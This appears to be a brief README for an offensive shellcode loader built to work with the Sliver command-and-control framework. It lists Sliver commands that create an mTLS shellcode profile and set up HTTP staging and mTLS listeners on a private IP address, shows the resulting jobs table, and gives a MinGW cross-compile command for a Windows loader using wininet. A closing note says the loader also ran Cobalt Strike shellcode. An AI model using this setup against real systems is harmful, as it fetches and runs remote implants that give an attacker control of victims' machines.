```bash
sliver > profiles new --mtls 192.168.45.156:443 -G --format shellcode sliver

sliver > stage-listener --url http://192.168.45.156:80 --profile sliver

sliver > mtls -L 192.168.45.156 -l 443

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile                          
==== ====== ========== ====== ========================================
 4    mtls   tcp        443                                           
 5    http   tcp        80     sliver (Sliver name: DEVELOPED_BULLET) 
```

Linux compile command:
```bash
x86_64-w64-mingw32-g++ main.cpp -o tryharder.exe -lwininet -static-libgcc -static-libstdc++
```

# Note:
This was intended to be used with sliver, but you can set your infra up to feed whatever shellcode into it and it should* work.

Was able to have the loader ingest Cobalt shellcode just fine. 
